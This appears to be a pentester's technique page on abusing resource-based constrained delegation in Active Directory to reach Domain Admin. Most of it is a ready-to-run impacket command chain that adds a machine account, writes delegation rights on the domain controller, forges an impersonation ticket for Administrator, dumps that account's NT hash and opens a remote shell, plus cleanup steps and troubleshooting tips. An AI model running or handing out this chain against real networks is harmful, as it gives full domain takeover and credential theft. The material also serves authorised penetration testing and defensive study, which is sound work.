---
title: RBCD to Domain Admin
slug: rbcd-to-domain-admin
category: techniques
updated: 2026-07-24
summary: "RBCD → DA: preconds, impacket addcomputer/rbcd/getST/secretsdump flow, verify + cleanup, Kerberos gotchas"
tags: [ad, rbcd, delegation, kerberos, s4u, impacket, privesc, domain-admin]
sensitive: false
---

# RBCD to Domain Admin

## When to use
You control a principal that has **write access to a computer object** (GenericAll /
GenericWrite / WriteDACL / WriteProperty on `msDS-AllowedToActOnBehalfOfOtherIdentity`),
the domain `MachineAccountQuota > 0`, and you want to impersonate any user (e.g.
Administrator) on that computer's services. Classic path: write access over the **DC**
object → full DA. Worked example: an AD lab (`Shared Support Accounts` group had
FullControl over `CN=DC,OU=Domain Controllers`).

## Preconditions (verify first)
| Requirement | Check |
|---|---|
| Write over target computer object | `dacledit.py -action read -principal MYUSER -target-dn 'CN=DC,OU=Domain Controllers,DC=d,DC=local' 'DOMAIN/MYUSER:PASS'` → look for FullControl / GenericWrite (`0xf01ff` = FullControl) |
| `MachineAccountQuota > 0` | `nxc ldap DC_IP -u USER -p PASS -M maq` (or read `ms-DS-MachineAccountQuota` on domain root). If 0, you cannot add a computer — need an existing controlled computer account instead. |
| Target has a service you can request (`cifs/`, `host/`, `http/`) | SMB/WinRM/etc. reachable on the target |

## Full flow (impacket, from toolbox / pena-vpn)
```bash
DOM=domain.local; DC_IP=<dc-ip>; DCFQDN=dc.domain.local
USER=support; PASS='<controlled-user-pass>'
NEWM='PWNED$'; NEWP='Pwn3d123!'   # attacker machine account

# 1. Add attacker-controlled computer account (needs MAQ>0)
impacket-addcomputer $DOM/$USER:"$PASS" -computer-name "$NEWM" -computer-pass "$NEWP" -dc-ip $DC_IP

# 2. Write RBCD: target (DC$) trusts NEWM to delegate
impacket-rbcd $DOM/$USER:"$PASS" -delegate-to 'DC$' -delegate-from "$NEWM" -action write -dc-ip $DC_IP

# 3. S4U: get a service ticket impersonating a privileged user
impacket-getST -spn cifs/$DCFQDN $DOM/"$NEWM":"$NEWP" -impersonate Administrator -dc-ip $DC_IP
#   → writes Administrator@cifs_dc.domain.local@DOMAIN.LOCAL.ccache

# 4. Use the ticket (DA-level)
export KRB5CCNAME=Administrator@cifs_${DCFQDN//./_}@${DOM^^}.ccache
impacket-secretsdump -k -no-pass $DCFQDN -just-dc-user Administrator   # NT hash of Administrator
impacket-wmiexec -k -no-pass $DCFQDN                                   # shell as Administrator
# or PtH with the dumped hash (no Kerberos):
impacket-wmiexec -hashes :<NTHASH> $DOM/Administrator@$DC_IP
```

## Verify RBCD was written
```bash
impacket-rbcd $DOM/$USER:"$PASS" -delegate-to 'DC$' -action read -dc-ip $DC_IP
# → lists NEWM under "Accounts allowed to act on behalf"
```

## Cleanup (do this — leave no artifacts)
```bash
impacket-rbcd $DOM/$USER:"$PASS" -delegate-to 'DC$' -action flush -dc-ip $DC_IP   # remove RBCD ACE
impacket-addcomputer $DOM/$USER:"$PASS" -computer-name "$NEWM" -action delete -dc-ip $DC_IP
```

## Gotchas
- **KRB5CCNAME must point at the exact ccache** `getST` wrote (SPN slashes → `_`, realm
  uppercase). Wrong path → falls back to password auth and fails.
- **Kerberos needs FQDN, not IP.** Add DC to `/etc/hosts` (`DC_IP dc.domain.local domain.local`)
  and use `-spn cifs/dc.domain.local`, `secretsdump dc.domain.local`. IP-only → `KRB_AP_ERR_...`.
- **Clock skew** → `KRB5KRB_AP_ERR_SKEW`. `sudo ntpdate DC_IP` (or `sudo rdate -n DC_IP`)
  before any Kerberos step.
- **MAQ=0** blocks step 1. If you already own a computer account (its password/hash), skip
  addcomputer and use it as `-delegate-from` / in `getST` directly.
- SPN choice = which service you get: `cifs/` → SMB (secretsdump/wmiexec), `http/` → WinRM,
  `host/` → broad. Impersonation is per-SPN.
- The impersonated user must **not** be in "Protected Users" and must be delegatable
  (no `NOT_DELEGATED` flag) — else S4U2Self returns no forwardable ticket.

## References
- Relacionado: [[active-directory-attacks]], [[ad-credential-looting]], [[netexec-crackmapexec]], [[privilege-escalation]], [[password-cracking]]
- Worked example: internal AD lab notes.
